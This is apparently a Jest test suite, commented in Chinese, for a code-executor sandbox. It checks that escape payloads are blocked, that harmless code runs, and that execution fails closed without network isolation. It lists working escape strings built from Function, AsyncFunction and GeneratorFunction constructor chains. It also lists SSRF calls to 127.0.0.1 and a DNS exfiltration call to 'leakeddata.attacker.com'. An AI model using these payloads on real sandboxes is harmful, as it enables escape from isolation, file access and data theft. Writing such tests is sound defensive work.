import { describe, it, expect } from '@jest/globals';
import { codeExecutorTool } from '../core/tools/external/CodeExecutorTool';

describe('CodeExecutorTool 沙箱逃逸防护', () => {
  // 实测复现的逃逸 payload
  const escapePayloads = [
    {
      name: 'AsyncFunction.constructor 逃逸（已修复）',
      code: `(async()=>{}).constructor("return this")()`,
    },
    {
      name: 'AsyncFunction 拼接绕过（已修复）',
      code: `(async()=>{}).constructor("this['pro'+'cess']")()`,
    },
    {
      name: 'GeneratorFunction 逃逸',
      code: `(function*(){}).constructor("return this")()`,
    },
    {
      name: 'AsyncGeneratorFunction 逃逸',
      code: `(async function*(){}).constructor("return this")()`,
    },
    {
      name: 'Function.prototype 构造器逃逸',
      code: `[].constructor.constructor("return this")()`,
    },
    {
      name: 'getBuiltinModule 绕过',
      code: `(async()=>{}).constructor("this['pro'+'cess'].getBuiltinModule('fs')")()`,
    },
  ];

  // 这些 payload 应被 dangerousPatterns 主线程拦截
  const preFilteredPayloads = [
    {
      name: '裸 process 引用',
      code: `process.exit()`,
    },
    {
      name: '裸 require fs',
      code: `require('fs')`,
    },
    {
      name: '裸 eval',
      code: `eval('1+1')`,
    },
    {
      name: '裸 new Function',
      code: `new Function('return 1')()`,
    },
    {
      name: '裸 getBuiltinModule',
      code: `process.getBuiltinModule('fs')`,
    },
    {
      name: '裸 AsyncFunction',
      code: `AsyncFunction('return 1')()`,
    },
    {
      name: '裸 GeneratorFunction',
      code: `GeneratorFunction('return 1')()`,
    },
    {
      name: '裸 WebAssembly',
      code: `WebAssembly.Module`,
    },
    // ===== 第十一轮：网络隔离新增拦截 =====
    {
      name: 'global 拼接绕过 globalThis（新增正则拦截）',
      code: `global['pro'+'cess']`,
    },
    {
      name: 'fetch 外网请求（新增正则拦截）',
      code: `fetch('http://127.0.0.1:3000/')`,
    },
    {
      name: 'dns 外带数据（新增正则拦截）',
      code: `dns.lookup('leakeddata.attacker.com')`,
    },
    {
      name: 'net.connect 端口探测（新增正则拦截）',
      code: `net.connect({host:'127.0.0.1',port:3000})`,
    },
    {
      name: 'http.get SSRF 打内网（新增正则拦截）',
      code: `http.get('http://127.0.0.1:3000/')`,
    },
    {
      name: 'http.request 外网（新增正则拦截）',
      code: `http.request('https://example.com')`,
    },
    {
      name: 'https 外网请求（新增正则拦截）',
      code: `https.get('https://example.com')`,
    },
    // ===== 第十二轮：constructor 链纵深防御 =====
    {
      name: '(()=>{}).constructor 拼接拿 process（新增正则拦截）',
      code: `(()=>{}).constructor('return this["pro"+"cess"]')()`,
    },
  ];

  // 安全代码应正常执行
  const safeCode = [
    {
      name: '基础数学运算',
      code: `1 + 2 * 3`,
      expected: 7,
    },
    {
      name: '字符串操作',
      code: `"hello".toUpperCase()`,
      expected: 'HELLO',
    },
    {
      name: 'JSON 操作',
      code: `JSON.stringify({a: 1})`,
      expected: '{"a":1}',
    },
    {
      name: '数组 map',
      code: `[1, 2, 3].map(x => x * 2)`,
      expected: [2, 4, 6],
    },
  ];

  describe('逃逸 payload 应被沙箱拦截', () => {
    for (const { name, code } of escapePayloads) {
      it(name, async () => {
        const result = await codeExecutorTool.execute('test', {
          code,
          language: 'javascript',
          timeout: 3000,
        });

        // 要么执行失败，要么成功但不返回危险对象
        if (result.success) {
          const val = result.result?.result;
          // 不应返回 process 或 require 等危险对象
          expect(val).not.toBe(undefined);
          if (typeof val === 'object' && val !== null) {
            // 逃逸成功时 (async()=>{}).constructor("return this")() 会返回 global 对象
            // 不应有 process/require 等属性
            expect(val.process).toBeUndefined();
            expect(val.require).toBeUndefined();
            expect(val.global).toBeUndefined();
          }
        }
        // 失败也接受（被 dangerousPatterns 拦截、无隔离能力 fail closed 或沙箱抛异常）
      });
    }
  });

  describe('主线程 dangerousPatterns 预过滤', () => {
    for (const { name, code } of preFilteredPayloads) {
      it(name, async () => {
        const result = await codeExecutorTool.execute('test', {
          code,
          language: 'javascript',
          timeout: 3000,
        });

        expect(result.success).toBe(false);
        expect(result.error).toBeDefined();
      });
    }
  });

  describe('安全代码执行（按平台区分安全模型）', () => {
    const isLinux = process.platform === 'linux';

    for (const { name, code, expected } of safeCode) {
      it(name, async () => {
        const result = await codeExecutorTool.execute('test', {
          code,
          language: 'javascript',
          timeout: 3000,
        });

        if (isLinux) {
          // Linux 具备网络隔离能力（unshare -n / -Urn），安全代码应正常执行
          expect(result.success).toBe(true);
          expect(result.result?.result).toEqual(expected);
        } else {
          // 非 Linux（Windows/macOS）无网络隔离能力，必须 fail closed 拒绝执行
          // （第十二轮 P0#1：绝不退化到裸 node --permission）
          expect(result.success).toBe(false);
          expect(result.error).toContain('网络隔离');
        }
      });
    }
  });

  describe('第十二轮：无隔离能力时 fail closed（P0#1）', () => {
    it('非 Linux 平台应拒绝执行并提示仅支持 Linux/容器环境', async () => {
      if (process.platform === 'linux') {
        // Linux 上具备隔离能力，本用例不适用
        return;
      }
      const result = await codeExecutorTool.execute('test', {
        code: '1 + 1',
        language: 'javascript',
        timeout: 3000,
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain('Linux');
      expect(result.error).toContain('网络隔离');
    });
  });
});
